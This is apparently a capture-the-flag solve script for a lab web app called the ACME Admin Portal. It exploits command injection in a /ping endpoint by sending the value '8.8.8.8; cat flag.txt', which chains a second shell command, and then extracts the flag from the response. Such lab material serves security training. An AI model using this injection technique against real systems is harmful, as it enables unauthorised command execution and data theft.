#!/usr/bin/env python3
"""
ACME Internal Admin Portal — CTF Solve Script
==============================================
Challenge Category : Web Exploitation
Vulnerability      : OS Command Injection (shell=True)
Author             : CTF Author

Usage:
    python solve.py
    python solve.py --host http://localhost:5000
"""

import argparse
import re
import sys
import urllib.parse
import urllib.request


BANNER = """
╔══════════════════════════════════════════════════════╗
║     ACME Internal Admin Portal — Exploit Script      ║
║     Vulnerability: OS Command Injection              ║
╚══════════════════════════════════════════════════════╝
"""


def exploit(host: str) -> str:
    """
    Exploit the OS command injection vulnerability in the /ping endpoint.

    The vulnerable code in app.py executes:
        subprocess.run(f"ping -c 1 {target}", shell=True, ...)

    By injecting a semicolon (;) we can terminate the ping command and
    chain an arbitrary second command. The server returns the combined
    output of both commands in the HTTP response.

    Payload breakdown:
        8.8.8.8       -> valid IP so ping doesn't immediately error
        ;             -> shell command separator
        cat flag.txt  -> read the flag file
    """
    payload = "8.8.8.8; cat flag.txt"
    encoded  = urllib.parse.quote(payload)
    url      = f"{host}/ping?target={encoded}"

    print(f"[*] Target        : {host}")
    print(f"[*] Endpoint      : /ping?target=<payload>")
    print(f"[*] Payload       : {payload}")
    print(f"[*] Encoded URL   : {url}")
    print()

    try:
        req  = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8")
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    # Extract flag from response body using regex
    match = re.search(r"flag\{[^}]+\}", body)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found!")
        print(f"[+] ══════════════════════════════════════")
        print(f"[+]  {flag}")
        print(f"[+] ══════════════════════════════════════")
        return flag
    else:
        print("[!] Flag not found in response. Raw output snippet:")
        # Print a small chunk of response for debugging
        start = body.find("OUTPUT")
        snippet = body[start:start+500] if start != -1 else body[:500]
        print(snippet)
        sys.exit(1)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="ACME Portal CTF Solve Script")
    parser.add_argument(
        "--host",
        default="http://localhost:5000",
        help="Base URL of the target (default: http://localhost:5000)"
    )
    args = parser.parse_args()
    host = args.host.rstrip("/")
    exploit(host)


if __name__ == "__main__":
    main()
